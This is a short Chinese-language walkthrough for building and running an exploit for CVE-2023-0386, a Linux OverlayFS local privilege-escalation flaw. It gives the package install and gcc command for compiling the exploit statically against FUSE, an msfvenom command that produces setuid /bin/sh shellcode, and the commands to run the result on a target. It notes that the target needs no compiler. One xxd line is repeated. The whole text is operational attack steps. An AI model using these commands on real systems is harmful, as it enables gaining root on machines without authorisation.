安装编译环境

```bash
sudo apt install -y gcc libfuse-dev pkg-config
```

编译 exp

```bash
gcc -Wall CVE-2023-0386.c `pkg-config fuse --cflags --libs` -D_FILE_OFFSET_BITS=64 -o CVE-2023-0386-exp -static -lfuse
```

生成 shellcode

```
msfvenom -p linux/x86/exec CMD=/bin/sh PrependSetuid=True -f elf -o shellcode.elf && xxd -i -c 8 shellcode.elf

xxd -i -c 8 shellcode.elf
```

目标执行，**不需要要求目标安装 gcc 等环境**

```
chmod +x CVE-2023-0386-exp && ./CVE-2023-0386-exp
```
